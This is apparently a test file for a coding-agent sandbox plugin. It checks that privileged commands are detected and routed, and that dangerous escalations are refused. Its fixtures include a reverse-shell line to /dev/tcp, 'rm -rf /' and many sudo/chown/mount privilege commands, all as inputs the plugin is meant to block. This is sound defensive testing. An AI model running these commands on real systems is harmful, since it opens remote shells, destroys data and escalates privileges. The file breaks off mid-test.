import { afterAll, beforeEach, describe, expect, test } from "bun:test"
import { createServer, type Server } from "node:http"
import type { AddressInfo } from "node:net"
import { mkdtemp, readFile, writeFile } from "node:fs/promises"
import { cleanupTestArtifacts as rm } from "./artifacts"
import { homedir } from "node:os"
import path from "node:path"
import { Cause, Effect, Exit, Option, Scope, Stream } from "effect"
import plugin from "../src/index"
import { commandNeedsOsPrivilege } from "../src/sandbox"
import { resetEscalationReviewLimiter } from "../src/security/escalation-reviewer"
import {
  CATEGORY_HEADER_PREFIX,
  ESCALATION_MARKER,
  JUSTIFICATION_HEADER_PREFIX,
} from "../src/security/escalation"

// --- `privilege` category: host-direct sandbox routing, fail-loud, and the
// escalation floor pre-check. The {host, privilege} dual arm keeps every
// classification assertion valid both in this tree (privilege-needing rules
// still map to `host`) and in the merged tree (rules remapped to `privilege`).

let workdir: string | undefined
const scopes: Scope.Closeable[] = []
const servers: Server[] = []

async function ensureWorkdir() {
  if (!workdir) workdir = await mkdtemp(path.join("/tmp/opencode/", "category-privilege-"))
  return workdir
}

beforeEach(() => {
  // The escalation reviewer has a process-wide rolling limiter (2 starts per
  // 3s); reset between tests so cross-test plumbing never slows the suite.
  resetEscalationReviewLimiter()
})

afterAll(async () => {
  for (const scope of scopes) {
    await Effect.runPromise(Scope.close(scope, undefined as never)).catch(() => {})
  }
  for (const server of servers) {
    await new Promise<void>((resolve) => server.close(() => resolve()))
  }
  if (workdir) await rm(workdir, { recursive: true, force: true })
})

// --- mock escalation reviewer (direct Python child posts here) ---------------

type MockReviewer = { endpoint: string; requests: unknown[]; }

async function startReviewer(content: string): Promise<MockReviewer> {
  const requests: unknown[] = []
  const server = createServer((req, res) => {
    req.resume()
    req.on("end", () => {
      requests.push({ url: req.url })
      res.writeHead(200, { "Content-Type": "application/json" })
      res.end(JSON.stringify({ choices: [{ message: { role: "assistant", content } }] }))
    })
  })
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve))
  servers.push(server)
  const port = (server.address() as AddressInfo).port
  return { endpoint: `http://127.0.0.1:${port}/v1`, requests }
}

// --- minimal host-context harness ---------------------------------------------

type CommandExec = (input: { sessionID: string; prompt: { text: string } }) => Effect.Effect<void, unknown>
type HookCb = (ev: never) => Effect.Effect<void, unknown>
type DynamicCall = { command: string; userBypass?: string[] }

type Harness = {
  executeBefore: HookCb
  createBefore: HookCb
  commands: Map<string, CommandExec>
  synthetic: Array<{ sessionID: string; text: string }>
  dynamicCalls: DynamicCall[]
}

async function failureMessage(effect: Effect.Effect<unknown, unknown>): Promise<string | undefined> {
  const exit = await Effect.runPromise(Effect.exit(effect))
  if (!Exit.isFailure(exit)) return undefined
  const found = Cause.findErrorOption(exit.cause)
  const error = Option.isSome(found) ? found.value : undefined
  return error instanceof Error ? error.message : String(error)
}

async function startPlugin(options: Record<string, unknown> = {}): Promise<Harness> {
  const directory = await ensureWorkdir()
  const collected: Partial<Record<string, HookCb>> = {}
  const commands = new Map<string, CommandExec>()
  const synthetic: Harness["synthetic"] = []
  const dynamicCalls: DynamicCall[] = []

  const ctx = {
    options,
    tool: {
      hook: (name: string, cb: HookCb) => {
        collected[name] = cb
        return Effect.void
      },
    },
    shell: {
      hook: (name: string, cb: HookCb) => {
        collected[`shell.${name}`] = cb
        return Effect.void
      },
    },
    command: {
      transform: (cb: (draft: { add(d: { name: string; execute: CommandExec }): void }) => void) =>
        Effect.sync(() => cb({ add: (d) => void commands.set(d.name, d.execute) })),
    },
    permission: {
      hook: () => Effect.void,
    },
    session: {
      // Context hook registrar stub: attachSessionContextHook
      // registers here; state notices are a no-op for these tests.
      hook: () => Effect.void,
      get: () => Effect.succeed({ location: { directory } }),
      context: () => Effect.succeed([{ type: "user", text: "Please fix the service ownership" }]),
      interrupt: () => Effect.void,
      synthetic: (input: { sessionID: string; text: string }) =>
        Effect.sync(() => {
          synthetic.push(input)
        }),
    },
    rpc: {
      register: () =>
        Effect.succeed({
          events: { emit: () => Effect.void },
        }),
    },
    event: { subscribe: () => Stream.fromIterable([]) },
  }

  const scope = await Effect.runPromise(Scope.make())
  scopes.push(scope)
  await Effect.runPromise(
    (plugin as { effect: (c: unknown) => Effect.Effect<unknown, unknown, never> })
      .effect(ctx)
      .pipe(Scope.provide(scope)),
  )

  return {
    executeBefore: collected["execute.before"]!,
    createBefore: collected["shell.create.before"]!,
    commands,
    synthetic,
    dynamicCalls,
  }
}

const invoke = (h: Harness, name: string, sessionID: string, text = "") =>
  failureMessage(h.commands.get(name)!({ sessionID, prompt: { text } }))

const runBefore = (h: Harness, sessionID: string, input: Record<string, unknown>) =>
  failureMessage(
    h.executeBefore({
      tool: "shell",
      sessionID,
      agent: "test",
      messageID: "m1",
      id: `call-${Math.random()}`,
      input,
    } as never),
  )

const escalation = (categories: string, justification: string, command: string) =>
  [ESCALATION_MARKER, `${CATEGORY_HEADER_PREFIX} ${categories}`, `${JUSTIFICATION_HEADER_PREFIX} ${justification}`, command].join("\n")

/** Drive create.before on a marked command and return the mutated event. */
async function spawnMarked(h: Harness, command: string) {
  const dir = await ensureWorkdir()
  const ev = {
    command,
    cwd: dir,
    shell: "/bin/bash",
    timeout: 60000,
    env: {} as Record<string, string | undefined>,
  }
  await Effect.runPromise(h.createBefore(ev as never))
  return ev
}

const MARKER_RE = /^: opencode-sandbox ([0-9a-f]{32})\n/

/** Wait until the reviewer-trace JSONL under `home` satisfies `probe`
 * (trace writes are fire-and-forget, so a read can race the append).
 * Returns whatever the file held at timeout. */
async function waitForTrace(home: string, probe: (text: string) => boolean, timeoutMs = 3000): Promise<string> {
  const file = path.join(home, ".opencode", "reviewer-trace.jsonl")
  const start = Date.now()
  for (;;) {
    const text = await readFile(file, "utf8").catch(() => "")
    if (text !== "" && probe(text)) return text
    if (Date.now() - start > timeoutMs) return text
    await new Promise((resolve) => setTimeout(resolve, 25))
  }
}

// --- privilege-launcher detection ---------------------------------------------

describe("commandNeedsOsPrivilege", () => {
  test("privilege launchers and boundary mutators are detected", () => {
    for (const script of [
      "sudo id",
      "sudo -n true",
      "doas id",
      "pkexec reboot",
      "su -c 'id'",
      "sudoedit /etc/sudoers",
      "runas /user:admin cmd",
      "chown root:root /etc/app.conf",
      "chown -R a b",
      "chgrp wheel /etc/app.conf",
      "setcap cap_net_raw+ep /bin/ping",
      "setfacl -m u:daemon:rwx /etc/app.conf",
      "mount /dev/sdb1 /mnt",
      "mount /dev/sda /mnt",
      "umount /mnt",
      "unshare -Ur bash",
      "nsenter -t 1 sh",
      "chroot /mnt /bin/sh",
      "chmod 4755 /usr/local/bin/helper",
      "chmod u+s /usr/local/bin/helper",
      "chmod 2755 /usr/local/bin/helper",
      "echo hi && sudo systemctl restart nginx",
      // Leading assignments and prefix wrappers keep the launcher in
      // command position.
      "FOO=1 sudo id",
      "env -i sudo id",
      "nice -n 5 sudo id",
      // Quoted payloads that are themselves executed are checked recursively.
      "sh -c 'sudo id'",
      "bash -lc 'chmod 4755 x'",
      "eval 'sudo id'",
      // The added silently-failing families.
      "sysctl -w kernel.x=1",
      "modprobe zram",
      "insmod x.ko",
      "rmmod x",
      "docker run --privileged x",
      "podman run --privileged x",
      "docker run -v /var/run/docker.sock:/var/run/docker.sock alpine",
      "echo 1 > /proc/sys/kernel/yama/ptrace_scope",
      "echo x | sudo tee /proc/sys/kernel/yama/ptrace_scope",
    ]) {
      expect(commandNeedsOsPrivilege(script)).toBe(true)
    }
  })

  test("third-round fixes: real execution forms are detected", () => {
    for (const script of [
      // Boolean container flags distinguish explicit values; the host PID
      // namespace matches in both spellings.
      "docker run --privileged=true alpine",
      "docker run --pid host alpine",
      "docker run --pid=host alpine",
      // Wrapper option/operand values that are themselves executed.
      "env -S 'sudo -n true'",
      "env --split-string 'sudo id'",
      "watch 'sudo id'",
      "watch -n 5 'sudo id'",
      // `case` branch commands sit in command position, both in the first
      // branch and in the `;;`-cut segments of later branches.
      "case x in x) sudo id ;; esac",
      "case x in a) echo hi ;; b) mount /dev/sdb1 /mnt ;; esac",
      // sysctl load forms apply settings — kernel writes, like -w.
      "sysctl -p",
      "sysctl -p /etc/sysctl.d/99-hardening.conf",
      "sysctl --system",
      "sysctl --load",
      // Unquoted-delimiter heredoc bodies expand $(…)/backticks.
      "cat <<EOF\n$(sudo id)\nEOF",
      "cat <<EOF\n`sudo id`\nEOF",
    ]) {
      expect(commandNeedsOsPrivilege(script)).toBe(true)
    }
  })

  test("third-round fixes: explicitly disabled or inert forms stay undetected", () => {
    for (const script of [
      // --privileged=false turns the flag off.
      "docker run --privileged=false alpine",
      // Quoted-delimiter heredoc bodies are literal text — $(…) and
      // backticks inside never execute.
      "cat <<'EOF'\n$(sudo id)\nEOF",
      "cat <<\"EOF\"\n$(sudo id)\nEOF",
      "cat <<'EOF'\n`sudo id`\nEOF",
      // Wrapper payloads and case branches that merely mention privilege
      // words in argument position.
      "env -S 'echo sudo'",
      "watch 'echo sudo'",
      "case x in x) echo sudo ;; esac",
      // A function definition names sudo without running it.
      "foo() { sudo id; }",
      // Non-host PID namespaces are not the host boundary.
      "docker run --pid=container:abc123 alpine",
    ]) {
      expect(commandNeedsOsPrivilege(script)).toBe(false)
    }
  })

  test("ordinary commands and non-setuid chmod stay undetected", () => {
    for (const script of [
      "ls -la",
      "cat /etc/passwd",
      "sum file",
      "mountain echo",
      "chmod 644 notes.txt",
      "chmod 644 x",
      "chmod +x build.sh",
      "chmod 1777 /tmp",
      "grep root /etc/passwd",
      // Privilege words in NON-execution positions never trigger the
      // host-direct routing (a false positive would strip the OS sandbox
      // from a harmless call).
      "echo sudo",
      "grep sudo README.md",
      "# sudo id",
      "echo hi # sudo id",
      "printf 'chmod 4755'",
      "FOO=sudo echo hi",
      "git commit -m \"use sudo carefully\"",
      "echo 'sudo id'",
      "echo \"sudo x\"",
      "command -v sudo",
      "cat /proc/sys/kernel/hostname",
      "sysctl -a",
      "docker ps",
      "bash -c 'echo hi'",
    ]) {
      expect(commandNeedsOsPrivilege(script)).toBe(false)
    }
  })

  test("routing-fix additions: privilege launchers and boundary tools are detected", () => {
    for (const script of [
      "runuser -u root -- id",
      "setpriv --reuid=0 id",
      "capsh --print",
      "useradd foo",
      "usermod -aG wheel foo",
      "userdel foo",
      "passwd root",
      "chpasswd < /tmp/hashes",
      "visudo",
      "iptables -L",
      "nft list ruleset",
      "ufw enable",
      "losetup /dev/loop0 disk.img",
      "setenforce 0",
      "kexec -e",
    ]) {
      expect(commandNeedsOsPrivilege(script)).toBe(true)
    }
  })

  test("routing-fix additions: the same words in non-execution positions stay undetected", () => {
    for (const script of [
      "echo runuser",
      "grep capsh README.md",
      "echo 'setpriv --reuid=0 id'",
      "# passwd root",
      "printf 'iptables -L'",
      "git commit -m \"use visudo\"",
    ]) {
      expect(commandNeedsOsPrivilege(script)).toBe(false)
    }
  })

  test("round2: shell heredoc bodies are scanned, non-shell consumers stay inert", () => {
    for (const script of [
      "bash <<'EOF'\nsudo id\nEOF",
      "bash <<EOF\nsudo id\nEOF",
      "sh <<EOF\nchown root:root /etc/app.conf\nEOF",
      "dash <<'D'\nrunuser -u root -- id\nD",
      "env bash <<EOF\nsetcap cap_net_raw+ep /bin/ping\nEOF",
      "command bash <<'EOF'\nmount /dev/sdb1 /mnt\nEOF",
      "bash <<A <<B\necho ok\nA\niptables -F\nB",
    ]) {
      expect(commandNeedsOsPrivilege(script)).toBe(true)
    }
    for (const script of [
      "cat <<EOF\nsudo id\nEOF",
      "cat <<'EOF'\nsudo id\nEOF",
      "python3 <<EOF\nprint(1)\nEOF",
      "python3 - <<'PY'\nprint('sudo')\nPY",
      "tee /tmp/out <<EOF\nsudo id\nEOF",
      "bash <<EOF\nls -la\necho done\nEOF",
      // stdin pipe (not a heredoc) stays a documented limitation.
      "echo 'sudo id' | sh",
    ]) {
      expect(commandNeedsOsPrivilege(script)).toBe(false)
    }
  })
})

// --- (a) effective set containing privilege routes host-direct -----------------

describe("privilege in the effective bypass set routes the call host-direct", () => {
  test("session lease: /bypass host privilege + sudo chown runs without the OS sandbox wrap", async () => {
    const options = {
      sandbox: { enabled: true },
      logReviewerTrace: false,
      reviewCommand: async (request: { command?: string; userBypass?: string[] }) => {
        return { decision: "ALLOW" as const, categories: [] }
      },
    }
    const h = await startPlugin(options)
    await invoke(h, "bypass", "s1", "host privilege")

    const command = "sudo chown www-data:www-data /srv/app/config.yml"
    const input: Record<string, unknown> = { command }
    expect(await runBefore(h, "s1", input)).toBeUndefined()

    // The call was allowed and carries a nonce marker (probe-independent:
    // the host-direct route inserts the marker even with no bwrap route).
    expect(String(input.command)).toMatch(MARKER_RE)

    // create.before resolves the marker to the helper's host-direct route:
    // MODE=rw + ALLOW_SUDO=1, the real bash carried via OPENCODE_REAL_BASH.
    const ev = await spawnMarked(h, String(input.command))
    expect(ev.command).toBe(command)
    expect(ev.shell).not.toBe("/bin/bash")
    expect(ev.env.OPENCODE_SANDBOX_MODE).toBe("rw")
    expect(ev.env.OPENCODE_SANDBOX_ALLOW_SUDO).toBe("1")
    expect(ev.env.OPENCODE_REAL_BASH).toBe("/bin/bash")

    // Observability: the agent is told this call runs without the OS sandbox
    // (the per-call reminder, distinct from the session ACTIVE notice).
    const reminder = h.synthetic.find((s) => s.sessionID === "s1" && s.text.includes("without the OS sandbox wrap"))
    expect(reminder?.text.startsWith("opencode-v2-security:")).toBe(true)
    expect(reminder?.text).toContain("this command needs OS privilege")

    // The routing is privilege-specific: without privilege armed the same
    // command is refused terminally (R1 fail-loud), never wrapped and never
    // spawned with a sandbox route that cannot run it.
    await invoke(h, "bypass", "s1", "off")
    await invoke(h, "bypass", "s2", "host")
    const plain: Record<string, unknown> = { command }
    const refusedPlain = await runBefore(h, "s2", plain)
    expect(refusedPlain).toContain("privilege category is not")
    expect(refusedPlain).toContain("privilege bypass category must be armed")
    expect(String(plain.command)).toBe(command)
  })

  test("privilege alone (no host armed) still routes a privilege-needing call host-direct", async () => {
    // Decoupling: the routing is driven by the `privilege` category itself,
    // not by the {host, privilege} pair the other tests arm.
    const options = {
      sandbox: { enabled: true },
      logReviewerTrace: false,
      reviewCommand: async () => ({ decision: "ALLOW" as const, categories: [] }),
    }
    const h = await startPlugin(options)
    await invoke(h, "bypass", "s1", "privilege")

    const command = "sudo chown www-data:www-data /srv/app/config.yml"
    const input: Record<string, unknown> = { command }
    expect(await runBefore(h, "s1", input)).toBeUndefined()
    expect(String(input.command)).toMatch(MARKER_RE)

    const ev = await spawnMarked(h, String(input.command))
    expect(ev.command).toBe(command)
    expect(ev.shell).not.toBe("/bin/bash")
    expect(ev.env.OPENCODE_SANDBOX_MODE).toBe("rw")
    expect(ev.env.OPENCODE_SANDBOX_ALLOW_SUDO).toBe("1")
    expect(ev.env.OPENCODE_REAL_BASH).toBe("/bin/bash")
  })

  test("per-call escalation grant host,privilege takes the same host-direct route", async () => {
    const mock = await startReviewer("allow_once")
    const h = await startPlugin({
      sandbox: { enabled: true },
      logReviewerTrace: false,
      failPolicy: "fail_close",
      dynamicReview: {
        baseURL: mock.endpoint,
        model: "escalation-test-model",
        apiKey: "escalation-test-key",
        timeoutMs: 15000,
        maxRounds: 1,
      },
      reviewCommand: async (request: { command?: string; userBypass?: string[] }) => {
        h.dynamicCalls.push({ command: request.command ?? "", userBypass: request.userBypass })
        return { decision: "ALLOW" as const, categories: [] }
      },
    })

    const command = "sudo systemctl restart nginx"
    const input: Record<string, unknown> = {
      command: escalation("host,privilege", "restart the service per the user request", command),
    }
    expect(await runBefore(h, "s1", input)).toBeUndefined()
    // The escalation reviewer was consulted exactly once and allowed once.
    expect(mock.requests).toHaveLength(1)
    // allow_once is the admission report for this call: the dynamic
    // reviewer does not re-judge it.
    expect(h.dynamicCalls).toHaveLength(0)

    expect(String(input.command)).toMatch(MARKER_RE)
    const ev = await spawnMarked(h, String(input.command))
    expect(ev.command).toBe(command)
    expect(ev.env.OPENCODE_SANDBOX_MODE).toBe("rw")
    expect(ev.env.OPENCODE_SANDBOX_ALLOW_SUDO).toBe("1")

    // The per-call grant did not arm a lease: the same command without the
    // header is refused terminally (R1) instead of running wrapped.
    const bare: Record<string, unknown> = { command }
    const refusedBare = await runBefore(h, "s1", bare)
    expect(refusedBare).toContain("privilege category is not")
    expect(`${refusedBare}`).toContain("privilege bypass category must be armed")
    expect(String(bare.command)).toBe(command)
  })
})

// --- (b) fail-loud when the sandbox cannot be removed --------------------------

describe("privilege routing fails loudly when the call cannot leave the sandbox", () => {
  test("ro profile: a privilege-needing command is refused terminally, never silently wrapped", async () => {
    const options = {
      sandbox: { enabled: true, mode: "ro" },
      logReviewerTrace: false,
      reviewCommand: async () => ({ decision: "ALLOW" as const, categories: [] }),
    }
    const h = await startPlugin(options)
    await invoke(h, "bypass", "s1", "host privilege")

    const command = "sudo chown www-data:www-data /srv/app/config.yml"
    const input: Record<string, unknown> = { command }
    const blocked = await runBefore(h, "s1", input)
    expect(blocked).toContain("Blocked by policy classifier")
    expect(blocked).toContain("cannot run it host-direct")
    expect(blocked).toContain("fail silently at runtime")
    // The message names every remedy.
    expect(blocked).toContain("sandbox bypass category must be armed")
    expect(blocked).toContain("sandbox category can be included when escalating privileged commands")
    expect(blocked).toContain("sandbox.allowSudo")
    // Fail-loud happens before any wrap: the command text is untouched.
    expect(String(input.command)).toBe(command)
    // And before the dynamic reviewer is reached.
    expect(h.dynamicCalls).toHaveLength(0)

    // Negative control: the same ro profile without privilege armed is also
    // refused terminally, but by the missing-privilege wording (R1) rather
    // than the read-only host-direct wording.
    await invoke(h, "bypass", "s2", "host")
    const missing = await runBefore(h, "s2", { command })
    expect(missing).toContain("privilege category is not")
    expect(missing).toContain("privilege bypass category must be armed")
    expect(missing).not.toContain("cannot run it host-direct")
  })
})

// --- (b2) fail-loud when the privilege category is not armed (R1) --------------

describe("a privilege-needing command is refused when privilege is not armed", () => {
  const command = "sudo systemctl restart nginx"

  test("reviewer ALLOW cannot run it for the empty, {host} or {filesystem} arm", async () => {
    for (const [index, categories] of [
      [0, []],
      [1, ["host"]],
      [2, ["filesystem"]],
    ] as const) {
      const h = await startPlugin({
        sandbox: { enabled: true },
        logReviewerTrace: false,
        reviewCommand: async (request: { command?: string; userBypass?: string[] }) => {
          h.dynamicCalls.push({ command: request.command ?? "", userBypass: request.userBypass })
          return { decision: "ALLOW" as const, categories: [] }
        },
      })
      const sessionID = `r1-arm-${index}`
      if (categories.length > 0) await invoke(h, "bypass", sessionID, categories.join(" "))
      const input: Record<string, unknown> = { command }
      const blocked = await runBefore(h, sessionID, input)
      expect(blocked).toContain("needs OS privilege")
      expect(blocked).toContain("privilege category is not")
      expect(blocked).toContain("privilege bypass category must be armed")
      // Refused before the dynamic reviewer: its ALLOW could never help.
      expect(h.dynamicCalls).toHaveLength(0)
      // No wrap, no marker — the command text is untouched.
      expect(String(input.command)).toBe(command)
    }
  })

  test("an allow_once escalation granting only filesystem still cannot run it", async () => {
    const mock = await startReviewer("allow_once")
    const h = await startPlugin({
      sandbox: { enabled: true },
      logReviewerTrace: false,
      failPolicy: "fail_close",
      dynamicReview: {
        baseURL: mock.endpoint,
        model: "escalation-test-model",
        apiKey: "escalation-test-key",
        timeoutMs: 15000,
        maxRounds: 1,
      },
      reviewCommand: async (request: { command?: string; userBypass?: string[] }) => {
        h.dynamicCalls.push({ command: request.command ?? "", userBypass: request.userBypass })
        return { decision: "ALLOW" as const, categories: [] }
      },
    })
    const input: Record<string, unknown> = {
      command: escalation("filesystem", "restart the service per the user request", command),
    }
    const blocked = await runBefore(h, "r1-esc", input)
    expect(blocked).toContain("needs OS privilege")
    expect(blocked).toContain("privilege category is not")
    // The escalation reviewer allowed the request once, but the grant did not
    // reach the dynamic reviewer: the routing refusal is terminal.
    expect(mock.requests).toHaveLength(1)
    expect(h.dynamicCalls).toHaveLength(0)
    expect(String(input.command)).toBe(command)
  })

  test("a shell-consumed privilege heredoc is refused unarmed, host-direct when armed", async () => {
    const command = "bash <<'EOF'\nsudo id\nEOF"
    const h = await startPlugin({
      sandbox: { enabled: true },
      logReviewerTrace: false,
      reviewCommand: async (request: { command?: string; userBypass?: string[] }) => {
        h.dynamicCalls.push({ command: request.command ?? "", userBypass: request.userBypass })
        return { decision: "ALLOW" as const, categories: [] }
      },
    })

    const unarmed: Record<string, unknown> = { command }
    const blocked = await runBefore(h, "r1-heredoc", unarmed)
    expect(blocked).toContain("needs OS privilege")
    expect(blocked).toContain("privilege category is not")
    expect(h.dynamicCalls).toHaveLength(0)
    expect(String(unarmed.command)).toBe(command)

    // Armed `privilege`: the same call takes the per-call host-direct route.
    await invoke(h, "bypass", "r1-heredoc-armed", "privilege")
    const armed: Record<string, unknown> = { command }
    expect(await runBefore(h, "r1-heredoc-armed", armed)).toBeUndefined()
    expect(String(armed.command)).toMatch(MARKER_RE)
    const ev = await spawnMarked(h, String(armed.command))
    expect(ev.env.OPENCODE_SANDBOX_MODE).toBe("rw")
    expect(ev.env.OPENCODE_SANDBOX_ALLOW_SUDO).toBe("1")
  })

  test("privilege words in strings, comments and arguments are not refused", async () => {
    const h = await startPlugin({
      sandbox: { enabled: true },
      logReviewerTrace: false,
      reviewCommand: async () => ({ decision: "ALLOW" as const, categories: [] }),
    })
    for (const script of [
      "echo 'sudo id'",
      "grep sudo README.md",
      'git commit -m "use sudo"',
      "echo hi # sudo id",
      "printf 'chown root /'",
    ]) {
      expect(await runBefore(h, "r1-neg", { command: script })).toBeUndefined()
    }
  })
})

// --- (c) escalation floor pre-check short-circuits before the reviewer ---------

describe("escalation floor pre-check", () => {
  test("a reverse-shell escalation is refused terminally with no reviewer HTTP call", async () => {
    const mock = await startReviewer("allow_once")
    const h = await startPlugin({
      sandbox: { enabled: false },
      logReviewerTrace: false,
      failPolicy: "fail_close",
      dynamicReview: {
        baseURL: mock.endpoint,
        model: "escalation-test-model",
        apiKey: "escalation-test-key",
        timeoutMs: 15000,
        maxRounds: 1,
      },
      reviewCommand: async (request: { command?: string; userBypass?: string[] }) => {
        h.dynamicCalls.push({ command: request.command ?? "", userBypass: request.userBypass })
        return { decision: "ALLOW" as const, categories: [] }
      },
    })

    const command = "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1"
    const input: Record<string, unknown> = {
      command: escalation("host,privilege", "need a shell for debugging", command),
    }
    const blocked = await runBefore(h, "s1", input)
    expect(blocked).toContain("cannot be escalated")
    expect(blocked).toContain("network.reverse-shell")
    expect(blocked).toContain("hard floor")
    expect(blocked).toContain("The escalation reviewer was not consulted")
    // Terminal ending: never points back at escalation.
    expect(blocked).not.toContain("ask for escalation")
    // No reviewer HTTP call, no dynamic review, no execution.
    expect(mock.requests).toHaveLength(0)
    expect(h.dynamicCalls).toHaveLength(0)

    // E3: a static floor refusal is not a reviewer denial — nothing is
    // recorded, so a resubmission hits the same floor check again instead of
    // being refused from history (still zero reviewer calls).
    const retry: Record<string, unknown> = {
      command: escalation("host,privilege", "trying again with a different reason", command),
    }
    const blockedAgain = await runBefore(h, "s1", retry)
    expect(blockedAgain).toContain("cannot be escalated")
    expect(mock.requests).toHaveLength(0)
  })

  test("a root-delete escalation is short-circuited the same way (floor, not categories)", async () => {
    const mock = await startReviewer("allow_once")
    const h = await startPlugin({
      sandbox: { enabled: false },
      logReviewerTrace: false,
      failPolicy: "fail_close",
      dynamicReview: {
        baseURL: mock.endpoint,
        model: "escalation-test-model",
        apiKey: "escalation-test-key",
        timeoutMs: 15000,
        maxRounds: 1,
      },
      reviewCommand: async () => ({ decision: "ALLOW" as const, categories: [] }),
    })

    const input: Record<string, unknown> = {
      command: escalation("filesystem,host", "maintenance sweep", "rm -rf /"),
    }
    const blocked = await runBefore(h, "s1", input)
    expect(blocked).toContain("cannot be escalated")
    expect(blocked).toContain("filesystem.root-delete")
    expect(blocked).not.toContain("ask for escalation")
    expect(mock.requests).toHaveLength(0)
  })

  test("opaque input (ASK verdict) is refused before the reviewer is ever called", async () => {
    const mock = await startReviewer("allow_once")
    const h = await startPlugin({
      sandbox: { enabled: false },
      logReviewerTrace: false,
      failPolicy: "fail_close",
      dynamicReview: {
        baseURL: mock.endpoint,
        model: "escalation-test-model",
        apiKey: "escalation-test-key",
        timeoutMs: 15000,
        maxRounds: 1,
      },
      reviewCommand: async (request: { command?: string }) => {
        h.dynamicCalls.push({ command: request.command ?? "" })
        return { decision: "ALLOW" as const, categories: [] }
      },
    })

    // input.opaque is an ASK verdict, not DENY: before the rework the precheck
    // returned early on non-DENY and the reviewer got a pointless call for a
    // command that cannot be reviewed locally at all.
    const command = `echo ${"a".repeat(33_000)}`
    const input: Record<string, unknown> = {
      command: escalation("host,privilege", "need a long echo", command),
    }
    const blocked = await runBefore(h, "s1", input)
    expect(blocked).toContain("cannot be escalated")
    expect(blocked).toContain("input.opaque")
    expect(blocked).toContain("The escalation reviewer was not consulted")
    expect(blocked).not.toContain("ask for escalation")
    // Terminal before the reviewer: zero HTTP calls, zero dynamic reviews.
    expect(mock.requests).toHaveLength(0)
    expect(h.dynamicCalls).toHaveLength(0)
  })

  test("empty input (zero-width command) is refused before the reviewer is ever called", async () => {
    const mock = await startReviewer("allow_once")
    const h = await startPlugin({
      sandbox: { enabled: false },
      logReviewerTrace: false,
      failPolicy: "fail_close",
      dynamicReview: {
        baseURL: mock.endpoint,
        model: "escalation-test-model",
        apiKey: "escalation-test-key",
        timeoutMs: 15000,
        maxRounds: 1,
      },
      reviewCommand: async () => ({ decision: "ALLOW" as const, categories: [] }),
    })

    // The escalation parser requires a non-empty command, but a zero-width
    // space passes that check while the classifier's normalization strips it
    // to an empty script (input.empty, DENY).
    const input: Record<string, unknown> = {
      command: escalation("host,privilege", "blank command", "\u200B"),
    }
    const blocked = await runBefore(h, "s1", input)
    expect(blocked).toContain("cannot be escalated")
    expect(blocked).toContain("input.empty")
    expect(blocked).toContain("The escalation reviewer was not consulted")
    expect(mock.requests).toHaveLength(0)
    expect(h.dynamicCalls).toHaveLength(0)
  })
})

// --- contract text: guidance and /bypass usage describe the real semantics -----

describe("agent-facing contract text", () => {
  test("escalation guidance separates host and privilege and states the host-direct consequence", async () => {
    const h = await startPlugin({ sandbox: { enabled: false }, logReviewerTrace: false })
    const first = await runBefore(h, "s1", { command: "rm -rf /etc" })
    expect(first).toContain("Categories: filesystem (local file changes)")
    expect(first).toContain("host (processes, services, and running-system state)")
    expect(first).toContain("privilege (crossing permission or isolation boundaries")
    expect(first).toContain("runs without the OS")
  })

  test("/bypass usage describes host vs privilege and the fail-loud fallback", async () => {
    const h = await startPlugin({ sandbox: { enabled: false }, logReviewerTrace: false })
    const usage = await invoke(h, "bypass", "s1", "bogus")
    expect(usage).toMatch(/Usage: \/bypass </)
    expect(usage).toContain("host = running-system state")
    expect(usage).toContain("privilege = crossing permission or isolation boundaries")
    expect(usage).toContain("runs host-direct without the OS sandbox")
    expect(usage).toContain("refused loudly")
  })
})

// --- (d) reminder/audit timing: written only on the finally-allowed path -------

describe("host-direct reminder and audit line are written only when the call is finally allowed", () => {
  test("a dynamic DENY writes no host-direct reminder and no privilege_host_direct audit line", async () => {
    if (process.env.PRIVILEGE_TRACE_CHILD !== "1") {
      // The reviewer trace lands in ~/.opencode/reviewer-trace.jsonl, and
      // bun's os.homedir() only reads $HOME at process startup — changing
      // process.env.HOME inside the test is ignored. So this test re-execs
      // itself in a child bun process with a throwaway HOME; the child runs
      // the scenario and every assertion below, the parent only requires it
      // to pass. Without this, the test would append its audit lines to the
      // user's real trace file.
      const home = await mkdtemp(path.join("/tmp/opencode/", "privilege-trace-home-"))
      try {
        const child = Bun.spawnSync({
          cmd: [
            process.execPath,
            "test",
            import.meta.path,
            "-t",
            "a dynamic DENY writes no host-direct reminder and no privilege_host_direct audit line",
          ],
          env: { ...process.env, HOME: home, PRIVILEGE_TRACE_CHILD: "1" },
          stdout: "pipe",
          stderr: "pipe",
        })
        expect(child.exitCode).toBe(0)
      } finally {
        await rm(home, { recursive: true, force: true })
      }
      return
    }

    // --- child body: HOME is a throwaway directory, trace writes land there.
    const home = homedir()
    let reviewerDecision: "DENY" | "ALLOW" = "DENY"
    const h = await startPlugin({
      sandbox: { enabled: true },
      logReviewerTrace: true,
      reviewCommand: async () =>
        reviewerDecision === "DENY"
          ? { decision: "DENY" as const, categories: ["privilege"] }
          : { decision: "ALLOW" as const, categories: [] },
    })
    await invoke(h, "bypass", "s1", "host privilege")

    // privilege is armed and the command needs OS privilege, but the
    // dynamic reviewer denies the call: the command never runs, so the
    // agent reminder and the audit line must not claim it did.
    const denied = await runBefore(h, "s1", { command: "sudo chown www-data:www-data /srv/app/config.yml" })
    expect(denied).toContain("Blocked by dynamic classifier")
    // Distinctive per-call reminder text — the session-level bypass
    // ACTIVE notice legitimately mentions "a call that needs OS
    // privilege", so the assertion targets the per-call phrasing.
    expect(h.synthetic.some((s) => s.text.includes("this command needs OS privilege"))).toBe(false)
    expect(h.synthetic.some((s) => s.text.includes("without the OS sandbox wrap"))).toBe(false)

    // The audit trail proves it was live for this call (bypass_active +
    // the DENY verdict) yet contains no privilege_host_direct line.
    const trace = await waitForTrace(home, (text) => text.includes('"decision":"DENY"'))
    expect(trace).toContain('"kind":"bypass_active"')
    expect(trace).toContain('"decision":"DENY"')
    expect(trace).not.toContain("privilege_host_direct")

    // Positive control on a fresh session with a fresh command: once the
    // same setup is ALLOWed, both are written exactly once — after the
    // final verdict, before the marker insertion.
    reviewerDecision = "ALLOW"
    await invoke(h, "bypass", "s2", "host privilege")
    const allowed = await runBefore(h, "s2", { command: "sudo chown root:root /etc/example.conf" })
    expect(allowed).toBeUndefined()
    const reminders = h.synthetic.filter(
      (s) =>
        s.sessionID === "s2" &&
        s.text.includes("this command needs OS privilege") &&
        s.text.includes("without the OS sandbox wrap"),
